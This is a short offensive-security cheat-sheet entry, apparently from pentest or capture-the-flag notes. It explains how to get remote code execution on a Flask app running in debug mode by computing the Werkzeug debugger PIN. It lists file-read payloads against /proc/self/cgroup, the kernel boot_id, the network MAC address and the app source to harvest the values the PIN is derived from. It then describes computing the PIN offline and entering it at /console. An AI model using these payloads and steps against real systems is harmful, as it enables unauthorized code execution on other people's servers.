# Werkzeug Debug Console PIN Bypass

If a Flask app leaks local file read (SSRF/LFI) and has debug mode on (`/console` exists), you may be able to compute Werkzeug's debugger PIN instead of brute-forcing it. The PIN is derived from predictable "public" and "private" machine bits — leak them via the same file-read primitive:

```bash
<lfi-param>=/proc/self/cgroup            # part of the machine id
<lfi-param>=/proc/sys/kernel/random/boot_id
<lfi-param>=/sys/class/net/eth0/address  # MAC, converted to decimal
<lfi-param>=/path/to/app.py              # confirms app/module name and path (public bits)
```

Feed the harvested values into Werkzeug's own PIN-generation algorithm (`werkzeug/debug/__init__.py` — pull it via the same LFI if unsure which hash it uses, md5 vs sha1 varies by version) to compute the PIN offline, then submit it at `/console` for RCE.
